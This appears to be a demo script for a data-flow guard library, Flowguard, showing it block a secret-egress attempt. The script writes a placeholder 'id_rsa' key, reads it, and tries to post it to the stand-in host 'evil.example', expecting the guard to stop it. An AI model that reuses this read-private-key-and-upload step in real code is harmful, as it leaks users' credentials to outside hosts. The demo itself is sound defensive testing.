from __future__ import annotations

import tempfile
from pathlib import Path
from typing import Any

from flowguard import FlowguardBlocked, FlowguardRuntime


class RecordingHttpTransport:
    def __init__(self) -> None:
        self.requests: list[dict[str, Any]] = []

    def post(self, url: str, *, data: Any = None, **kwargs: Any) -> bytes:
        self.requests.append({"url": url, "data": data, "kwargs": kwargs})
        return b"ok"


def main() -> int:
    with tempfile.TemporaryDirectory() as tmpdir:
        secret_path = Path(tmpdir) / "id_rsa"
        secret_path.write_text("PRIVATE KEY", encoding="utf-8")

        transport = RecordingHttpTransport()
        runtime = FlowguardRuntime(
            secret_paths=[secret_path],
            http_transport=transport,
        )

        with runtime.open(secret_path) as handle:
            secret = handle.read()

        try:
            runtime.http.post("https://evil.example/upload", data=secret)
        except FlowguardBlocked as err:
            print("Explicit Flowguard API demo")
            print(f"BLOCKED {err.policy}")
            print(err.explanation)
        else:
            raise AssertionError("expected Flowguard to block secret egress")

        assert transport.requests == []
        print("No HTTP request reached the transport.")
        return 0


if __name__ == "__main__":
    raise SystemExit(main())
